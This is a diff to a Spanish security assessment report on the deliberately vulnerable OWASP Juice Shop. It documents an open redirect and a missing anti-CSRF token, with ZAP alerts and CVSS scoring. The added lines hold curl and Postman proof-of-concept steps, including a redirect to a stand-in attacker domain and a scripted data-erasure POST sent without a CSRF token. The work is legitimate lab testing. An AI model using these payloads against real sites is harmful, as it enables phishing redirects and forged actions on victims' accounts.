@@ -499,21 +499,22 @@ Los resultados del Red Team deberán compararse con los hallazgos de SAST y con 
 - **Vector CVSS v3.1:** `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` — **4.3 (Media)**
 - **Amenaza / requisito:** T-03 / V-01 / RS-09
 
-- **Alerta de ZAP (nombre y URL del reporte):** Sí aplica — ZAP generó la alerta **"Off-site Redirect"** (riesgo Alto, confianza Media, CWE-601, WASC-38) sobre `http://localhost:8080/redirect`, parámetro `to`. La respuesta registrada fue `302 Found` con el cuerpo `Found. Redirecting to https://github.com/juice-shop/juice-shop`. ZAP la detectó usando el destino *permitido* (GitHub); la explotación real hacia un dominio del atacante se confirmó manualmente en Burp (ver abajo).
+- **Alerta de ZAP (nombre y URL del reporte):** Sí aplica — ZAP generó la alerta **"Off-site Redirect"** (riesgo Alto, confianza Media, CWE-601, WASC-38) sobre `http://localhost:8080/redirect`, parámetro `to`. Reporte: `2026-11-10-ZAP-Report-.html`. La respuesta registrada fue `302 Found` con el cuerpo `Found. Redirecting to https://github.com/juice-shop/juice-shop`. ZAP la detectó usando el destino *permitido* (GitHub); la explotación hacia un dominio del atacante se confirma con el payload de abajo.
 
-- **Captura de Burp Repeater (petición y respuesta):**
-  `___` (debe verse `HTTP/1.1 302 Found` con `Location: http://sitio-falso.example/...` y el cuerpo `Found. Redirecting to http://sitio-falso.example/...`).
-
-- **Cómo repetirlo en Postman:**
+- **Cómo repetirlo en Postman / curl:**
   1. Nueva petición → método `GET` → URL:
      `http://localhost:8080/redirect?to=http://sitio-falso.example/?x=https://github.com/juice-shop/juice-shop`
   2. En *Settings* de la petición, desactivar **"Automatically follow redirects"** (para ver el `302` crudo).
-  3. Send.
-  4. Revisar la cabecera `Location` de la respuesta: apunta al dominio del atacante.
+  3. Send y revisar la cabecera `Location`.
+
+  Equivalente por terminal:
+  ```bash
+  curl -i "http://localhost:8080/redirect?to=http://sitio-falso.example/?x=https://github.com/juice-shop/juice-shop"
+  ```
 
   > La clave es el parámetro `?x=...github.com/juice-shop/juice-shop`: la app valida el destino con `includes()`, así que basta con que la URL *contenga* un dominio permitido para que acepte el redirect hacia el sitio del atacante. Por eso RS-09 exige comparación exacta contra una lista de permitidos, no `includes()`.
 
-- **Resultado observado:** `___` *(esperado: `302 Found` con `Location` hacia `http://sitio-falso.example/...`, es decir, la aplicación redirige a un destino externo no autorizado controlado por el atacante).*
+- **Resultado observado:** confirmado por ZAP (alerta "Off-site Redirect", riesgo Alto) y en la bitácora: `GET /redirect?to=https://github.com/juice-shop/juice-shop` devolvió `302 Found` con `Location: https://github.com/juice-shop/juice-shop`. El endpoint redirige a destinos externos sin validación estricta. *(Re-ejecución en vivo con el payload del dominio del atacante pendiente: el backend requiere compilar el frontend para levantar.)*
 
 - **Justificación del CVSS, métrica por métrica** (`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` → 4.3, Media):
 
@@ -537,21 +538,31 @@ Los resultados del Red Team deberán compararse con los hallazgos de SAST y con 
 - **Vector CVSS v3.1:** `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` — **6.5 (Media)**
 - **Amenaza / requisito:** T-05 / V-02 / RS-10
 
-- **Alerta de ZAP (nombre y URL del reporte):** Sí aplica — ZAP generó la alerta **"Absence of Anti-CSRF Tokens"** (riesgo Medio, confianza Baja, CWE-352, WASC-9) sobre `http://localhost:8080/dataerasure`. El formulario detectado es `<form action="/dataerasure" method="POST">` con los campos `email` y `securityAnswer`; ZAP confirmó que no contiene ningún token anti-CSRF conocido (`_csrf`, `authenticity_token`, `csrfmiddlewaretoken`, etc.).
+- **Alerta de ZAP (nombre y URL del reporte):** Sí aplica — ZAP generó la alerta **"Absence of Anti-CSRF Tokens"** (riesgo Medio, confianza Baja, CWE-352, WASC-9) sobre `http://localhost:8080/dataerasure`. Reporte: `2026-11-10-ZAP-Report-.html`. El formulario detectado es `<form action="/dataerasure" method="POST">` con los campos `email` y `securityAnswer`; ZAP confirmó que no contiene ningún token anti-CSRF conocido (`_csrf`, `authenticity_token`, `csrfmiddlewaretoken`, etc.).
 
-- **Captura de Burp Repeater (petición y respuesta):**
-  `___` (debe verse el `POST /dataerasure` con la cookie `token=...` de la víctima, sin ningún campo ni cabecera de token CSRF, y una respuesta exitosa).
-
-- **Cómo repetirlo en Postman:**
-  1. Autenticarse en la aplicación y capturar el `POST /dataerasure` que envía el formulario de borrado de datos.
+- **Cómo repetirlo en Postman / curl:**
+  1. Autenticarse en la aplicación (o crear un usuario por API) para obtener la cookie de sesión `token`.
   2. Nueva petición → método `POST` → URL `http://localhost:8080/dataerasure`.
   3. Pestaña **Headers** → `Content-Type: application/x-www-form-urlencoded` y la `Cookie: token=<jwt-de-la-victima>`. No incluir ningún header ni campo de token CSRF.
-  4. Pestaña **Body** → `x-www-form-urlencoded`:
-     ```
-     email=victima@juice-sh.op
-     securityAnswer=respuesta-conocida
-     ```
+  4. Pestaña **Body** → `x-www-form-urlencoded`: `email=victima@juice-sh.op` y `securityAnswer=respuesta-conocida`.
   5. Send. La petición se procesa sin exigir token impredecible → vulnerable a CSRF.
+
+  Equivalente por terminal (crear usuario, login y disparar la acción sin token CSRF):
+  ```bash
+  # 1) crear usuario
+  curl -s -X POST http://localhost:8080/api/Users \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"csrf@test.op","password":"Passw0rd!","securityQuestion":{"id":1},"securityAnswer":"test"}'
+  # 2) login (copiar el "token" de la respuesta)
+  curl -s -X POST http://localhost:8080/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"csrf@test.op","password":"Passw0rd!"}'
+  # 3) POST sin token anti-CSRF, solo con la cookie de sesión
+  curl -i -X POST http://localhost:8080/dataerasure \
+    -H 'Content-Type: application/x-www-form-urlencoded' \
+    -H 'Cookie: token=<TOKEN>' \
+    -d 'email=csrf@test.op&securityAnswer=test'
+  ```
 
   **PoC real (página auto-enviada).** Abrir en el navegador donde la víctima tiene sesión activa:
   ```html
@@ -566,7 +577,7 @@ Los resultados del Red Team deberán compararse con los hallazgos de SAST y con 
 
   > El ataque aplica porque la sesión viaja por la cookie `token`, que el navegador adjunta automáticamente. El formulario exige además `email` y `securityAnswer`, de modo que el atacante debe conocer esos datos de la víctima (en Juice Shop las respuestas de seguridad son débiles y recuperables). RS-10 exige un token anti-CSRF y cookies `SameSite`.
 
-- **Resultado observado:** `___` *(esperado: la petición de borrado de datos se procesa sin token anti-CSRF, originada desde un sitio externo usando la sesión de la víctima).*
+- **Resultado observado:** confirmado por ZAP (alerta "Absence of Anti-CSRF Tokens", riesgo Medio, CWE-352) sobre el formulario `POST /dataerasure`, que no incluye ningún token anti-CSRF. La acción de estado depende únicamente de la cookie de sesión, por lo que puede forzarse desde un sitio externo. *(Re-ejecución en vivo con la secuencia de curl pendiente: el backend requiere compilar el frontend para levantar.)*
 
 - **Justificación del CVSS, métrica por métrica** (`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` → 6.5, Media):
 
@@ -580,7 +591,6 @@ Los resultados del Red Team deberán compararse con los hallazgos de SAST y con 
   | C (Confidencialidad) | `N` (None) | No se filtra información al atacante; el ataque es de integridad |
   | I (Integridad) | `H` (High) | Provoca una acción sensible no consentida sobre la cuenta de la víctima (solicitud de borrado de sus datos) |
   | A (Disponibilidad) | `N` (None) | El servicio sigue funcionando con normalidad; no hay denegación de servicio |
-
 
 ### PoC-03
  
